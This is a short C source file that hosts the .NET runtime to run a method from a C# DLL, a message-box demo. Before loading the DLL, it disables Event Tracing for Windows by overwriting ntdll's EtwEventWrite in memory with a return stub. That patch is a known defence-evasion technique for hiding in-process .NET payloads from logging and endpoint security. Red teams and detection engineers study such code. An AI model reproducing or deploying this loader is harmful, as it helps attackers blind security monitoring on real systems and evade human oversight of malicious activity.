//Call C# Assembly from a C program
//Disables Event Tracing for Windows
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

void disableETW() {

    DWORD oldProt, oldOldProt;

    //DISABLE ETW
    // Get the EventWrite function
    void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");

    // Allow writing to page
    VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);

    // Patch with "xor rax, rax; ret"
    memcpy(eventWrite, "\x48\x33\xc0\xc3", 4);

    // Return memory to original protection
    VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);
}

int main() {
    //Working basic C# dll call

    ICLRMetaHost* metaHost = NULL;
    ICLRRuntimeInfo* runtimeInfo = NULL;
    ICLRRuntimeHost* runtimeHost = NULL;

    //Disable Event Tracing for Windows
    //This is a simple basic version that overwrites the library to directly return when EtwEventWrite is called
    //uncomment the correct target architecture
    disableETW();
    
    //Create CLR hosting interface and call C# DLL
    if (CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost) == S_OK)
        if (metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo) == S_OK)
            if (runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost) == S_OK)
                if (runtimeHost->Start() == S_OK)
                {
                    DWORD pReturnValue;
                    //ExecuteInDefaultAppDomain(Assembly Path, NameSpace.Class, Method, argument, return value pointer)
                    runtimeHost->ExecuteInDefaultAppDomain(L"C:\\cs_pop_box_dll.dll", L"dllNamespace.dllClass", L"ShowMsg", L"It works!!", &pReturnValue);

                    runtimeInfo->Release();
                    metaHost->Release();
                    runtimeHost->Release();
                }
    


    return 0;
}
